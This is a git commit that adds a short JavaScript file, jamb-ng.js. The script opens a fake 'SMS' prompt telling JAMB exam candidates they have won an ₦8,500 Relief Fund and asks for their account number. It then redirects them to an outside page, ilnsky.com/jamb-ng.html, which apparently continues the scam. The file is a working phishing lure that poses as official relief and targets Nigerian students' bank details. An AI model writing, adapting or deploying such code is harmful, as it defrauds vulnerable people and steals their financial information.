b3e687fc44558931866c143b3671d7d1f9aa5382
ukpeha55-stack <ukpeha55@gmail.com>
2026-02-17 23:05:53 +0100

    Create jamb-ng.js

---
+++ jamb-ng.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦8,500'
+password=prompt('SMS: Congratulations, You are among the select JAMB candidates to receive ₦8,500 Relief Fund, click OK to Enter Your Acc. Number','WITHDRAW ₦8,500');
+if (password != 'WITHDRAW ₦8,500') {
+location.href='https://ilnsky.com/jamb-ng.html';
+}
